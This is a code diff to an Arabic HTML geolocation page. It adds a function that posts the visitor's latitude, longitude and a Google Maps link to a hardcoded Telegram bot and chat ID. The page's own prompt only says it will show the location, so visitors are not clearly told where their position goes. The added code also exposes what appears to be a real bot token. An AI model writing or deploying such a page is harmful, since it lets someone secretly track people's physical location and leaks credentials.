@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديد الموقع</title>
+    <title>تحديد الموقع وإرساله</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,7 +34,7 @@
     </style>
 </head>
 <body>
-    <h1>تحديد الموقع الجغرافي</h1>
+    <h1>تحديد الموقع وإرساله</h1>
     <p>اضغط على الزر أدناه للحصول على الموقع الجغرافي.</p>
     <button onclick="getLocation()">احصل على الموقع</button>
     <div id="output"></div>
@@ -49,9 +49,14 @@
                     (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
+
+                        // عرض الرابط على خرائط Google
+                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                         output.innerHTML = `الموقع الحالي:<br> 
-                        <strong>خط العرض:</strong> ${latitude}<br> 
-                        <strong>خط الطول:</strong> ${longitude}`;
+                        <a href="${googleMapsLink}" target="_blank">عرض على خرائط Google</a>`;
+
+                        // إرسال الموقع إلى بوت تيليجرام
+                        sendToTelegram(latitude, longitude);
                     },
                     (error) => {
                         output.innerHTML = "حدث خطأ في الحصول على الموقع. تأكد من تفعيل الموقع الجغرافي.";
@@ -60,6 +65,32 @@
             } else {
                 output.innerHTML = "المتصفح لا يدعم تحديد الموقع الجغرافي.";
             }
+        }
+
+        function sendToTelegram(latitude, longitude) {
+            const botToken = "6907816398:AAGqJzRPRxRaVGUS84cA-sZD8kl26s6wOlE"; // ضع رمز البوت هنا
+            const chatId = "6486770497";    // ضع معرف المحادثة هنا
+            const message = `📍 الموقع الحالي:\nخط العرض: ${latitude}\nخط الطول: ${longitude}\n🔗 خرائط Google: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("تم إرسال الموقع إلى تيليجرام بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء إرسال الموقع إلى تيليجرام.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
         }
     </script>
 </body>
